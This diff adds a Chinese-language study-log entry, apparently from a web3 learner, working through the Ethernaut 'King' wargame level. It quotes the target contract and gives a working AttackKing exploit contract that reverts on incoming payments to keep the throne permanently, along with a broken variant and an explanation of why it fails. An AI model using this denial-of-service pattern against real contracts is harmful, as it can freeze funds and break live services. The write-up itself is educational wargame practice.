@@ -16,6 +16,128 @@ web3萌新
 
 <!-- Content_START -->
 
+# 2025-08-29
+<!-- DAILY_CHECKIN_2025-08-29_START -->
+## **9.King**
+
+下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.
+
+这么有趣的游戏, 你的目标是攻破他.
+
+当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+​
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+​
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+​
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+​
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+
+首先查看一下当前的prize，是0.001ether
+
+await web3.utils.fromWei(await contract.prize())
+
+难点不在于如何获取国王，而在于如何保证国王不被重新夺回，因此这里想到如果交易一直不被认可，就会被一直revert，旧国王就一直不会被替代。
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+​
+contract AttackKing{
+    address public target;
+​
+    constructor(address payable _target)
+    {
+        target = _target;
+    }
+​
+    function attack() public payable 
+    {
+        (bool ok, ) = target.call{value: msg.value}("");
+        require(ok, "initial claim failed");
+    }
+    receive() external payable 
+    {
+        revert("king");
+    }
+    fallback() external payable {
+        revert("king");
+    }
+}
+​
+```
+
+### **错误示例：**
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+​
+contract AttackKing{
+    address public target;
+​
+    constructor(address payable _target)
+    {
+        target = _target;
+    }
+​
+    function attack() public 
+    {
+        (bool ok, ) = target.call{value: 0.002 ether}("");
+        require(ok, "initial claim failed");
+    }
+    receive() external payable 
+    {
+        revert("king");
+    }
+    fallback() external payable {
+        revert("king");
+    }
+}
+```
+
+**合约自己没钱，却硬要转钱**
+
+在你写的 `attack()` 里：
+
+```
+(bool ok, ) = target.call{value: 0.002 ether}("");
+```
+
+这里的 **0.002 ether** 不是直接从你的外部钱包扣，而是要从 **AttackKing 合约余额里扣**。 但你的合约：
+
+-   构造函数不是 `payable`，部署时不能带钱；
+    
+-   `receive` 和 `fallback` 都写了 `revert("king")`，别人也没法给它转钱；
+    
+-   结果就是：合约余额永远是 0。
+    
+
+所以一调用 `call{value:0.002 ether}`，EVM 检查余额不足 → 直接失败 → `ok=false`。
+<!-- DAILY_CHECKIN_2025-08-29_END -->
+
+
 # 2025-08-26
 <!-- DAILY_CHECKIN_2025-08-26_START -->
 ## **8.Vault**
